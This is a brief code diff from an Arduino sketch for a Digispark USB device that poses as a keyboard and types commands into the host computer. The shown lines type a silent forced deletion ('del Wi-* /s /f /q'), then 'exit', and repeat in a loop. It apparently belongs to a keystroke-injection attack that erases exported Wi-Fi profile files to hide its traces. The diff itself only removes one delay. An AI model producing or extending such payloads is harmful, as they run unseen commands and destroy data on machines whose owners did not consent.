@@ -23,7 +23,6 @@ void loop() {
   DigiKeyboard.println("del Wi-* /s /f /q"); 
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("exit");
-  DigiKeyboard.delay(100);  
   DigiKeyboard.delay(90000);
   
 }
